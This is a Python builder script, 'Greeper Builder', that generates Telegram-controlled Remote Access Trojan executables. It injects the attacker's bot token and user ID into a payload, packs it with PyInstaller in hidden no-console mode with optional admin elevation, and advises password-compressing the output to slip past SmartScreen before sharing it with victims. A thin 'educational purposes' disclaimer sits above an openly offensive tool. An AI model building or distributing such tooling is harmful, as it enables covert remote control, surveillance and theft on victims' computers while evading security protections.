#Greeper Builder v1.0

import time
import os
import sys
import shutil
import PyInstaller.__main__ as pi

def hkrprint(words):
    for i in words:
        print(i,end='',flush=True)
        time.sleep(0.01)
    
os.system("color 0c")

print("====================================================================================================")
hkrprint("DISCLAIMER\n")
print("====================================================================================================",end='')
disclamer='''
The provided Remote Access Trojan (RAT) is intended for educational and informational purposes only.
The use of RATs for unauthorized access to computer systems is illegal and unethical.
I do not endorse or support any illegal activities, including hacking or unauthorized surveillance.
Users are responsible for ensuring that their actions comply with all applicable laws and regulations.
Always obtain proper authorization before accessing or testing any systems.
'''
hkrprint(disclamer)
print("====================================================================================================")
hkrprint('''
By proceeding, you confirm that you understand the risks and have obtained the necessary permissions.
Press Enter to confirm and continue...
''')
input()
hkrprint('''
Re confirmation:
(Type YES to continue)
Are you sure?: ''')
confirm=input()
#confirm.upper()=="YES"?os.system("cls"):(input("Press enter to exit...");sys.exit())
if confirm.upper() == "YES":
    os.system("cls") 
else:
    input("Press Enter to exit...")
    sys.exit()

me='''
|‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|
|      G G G G G G G      G      G G G G G      G               |
|       G                  G      G       G      G              |
|        G                  G      G       G      G             |
|         G     G G G G      G      G G G G G      G            |
|          G     G     G      G      G   G          G           |
|           G     G     G             G     G                   |
|            G G G G     G      G      G       G      G         |
|                                                               |
|                          @GodInReach                          |
|                                                               |
|                |‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾|               |
|                |        Greeper_Builder       |               |
|                |______________________________|               |
|_______________________________________________________________|\n'''
print(me)
hkrprint("First things First\ncreate a Telegram BOT with @BotFather\nCopy your Bot\'s Token\nGet your UserID from @userinfobot\n\nRemember 2 clients with same payload \nshould not come online at the same time\n\n")

try:
    originaldir=os.getcwd()
    parentdir = os.path.dirname(originaldir)
    tmp = os.environ["temp"]
    if os.path.exists(tmp+"\\GBuilder"):
        shutil.rmtree(tmp+"\\GBuilder")
    os.mkdir(tmp+"\\GBuilder")
except Exception as e:
    pass

try:
    paypath=input("Enter your payload path: ")
    if paypath.startswith('"') and paypath.endswith('"'):
        paypath=paypath[1:-1]
    payload=open(paypath).read()
except Exception as e:
    print(e)
    input("Press Enter to exit...")
    sys.exit(0)
btoken=input("\nEnter your bot token (From Botfather):")
uid=input("Enter your User Id (From Userinfobot):")
payload=payload.replace("YOUR_BOT_TOKEN",btoken)
payload=payload.replace("YOUR_USER_ID",uid)
hkrprint("\nAdmin access enables u to do anything the user can do but\nPayload with Admin access may trigger antivirus\nDo you want admin access? (y/n): ")
adminaccess=input()
os.system("cls")
print(me)
#hkrprint("Creating a payload for you...\nIt may look stuck but its working in background...\nYou may see some warnings, its common\n")
hkrprint("Cooking the payload for you...\nIt might seem like it's on a tea break, \nbut it's actually working away in the background...\nIf you see some warnings, just think it as an alarm clock and ignore it! :)\n\n")

spath=os.path.join(tmp, 'GBuilder', 'spec')
wpath=os.path.join(tmp, 'GBuilder', 'Build')
dpath=os.path.join(parentdir,'Payload')
paypath=os.path.join(tmp, 'GBuilder', 'Greeper_Payload.py')

with open(tmp+"\\GBuilder\\Greeper_Payload.py","w") as file:
    file.write(payload)

if adminaccess.upper() == "Y":
    try:
        pi.run([
            "--onefile",
            "--clean",
            "--noconsole",
            "--log-level=ERROR",
            f"--upx-dir={originaldir}\\upx.exe",
            f"--icon={originaldir}\\exe.ico",
            "--uac-admin",
    #        f"--version-file={originaldir}\\Lib\\version-file.txt",
            "--specpath", spath,
            "--workpath", wpath,
            "--distpath", dpath,
            paypath
        ])
    except Exception as e:
        print(e)
        input()
else:
    try:
        pi.run([
            "--onefile",
            "--clean",
            "--noconsole",
            "--log-level=ERROR",
            f"--upx-dir={originaldir}\\upx.exe",
            f"--icon={originaldir}\\exe.ico",
    #        f"--version-file={originaldir}\\Lib\\version-file.txt",
            "--specpath", spath,
            "--workpath", wpath,
            "--distpath", dpath,
            paypath
        ])
    except Exception as e:
        print(e)
        input()

try:
    shutil.rmtree(tmp+"\\GBuilder")
    #shutil.rmtree(originaldir+"\\Scripts\\dist")
except:
    pass

os.system("cls")
print(me)
hkrprint("\nPayload Created Successfully")
hkrprint("\nPayload is saved at "+parentdir+"\\Payload")
hkrprint("\nTip:Compress the payload with 7z with pass to avoid smartscreen\n")
hkrprint("\nRemember Start your bot from your telegram account atleast once\n(i mean acc which the id belongs to.) before sharing the payload.")
hkrprint("\nUse a bot token for only 1 payload!\nIf 2 clients come online with same bot token there will be a crash.\n")
hkrprint("\nSend /help in telegram bot to get help after the client is online.")
hkrprint("\nSend feedback or feature requests to Tele @GodInReach")
hkrprint("\nHave Fun...")
input()

